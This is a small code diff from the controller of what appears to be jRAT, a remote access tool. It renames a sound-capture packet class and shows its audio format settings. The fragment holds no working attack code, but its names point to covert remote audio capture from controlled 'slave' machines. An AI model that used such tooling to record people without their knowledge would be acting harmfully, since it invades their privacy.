@@ -11,7 +11,7 @@ import se.jrat.controller.Slave;
 import se.jrat.controller.ui.dialogs.DialogRemoteSoundCapture;
 
 
-public class Packet58SoundCapture extends AbstractIncomingPacket {
+public class Packet58SoundDownload extends AbstractIncomingPacket {
 
 	public static final AudioFormat format = new AudioFormat(AudioFormat.Encoding.PCM_SIGNED, 44100, 16, 2, 4, 44100, false);
 	private static DataLine.Info info;
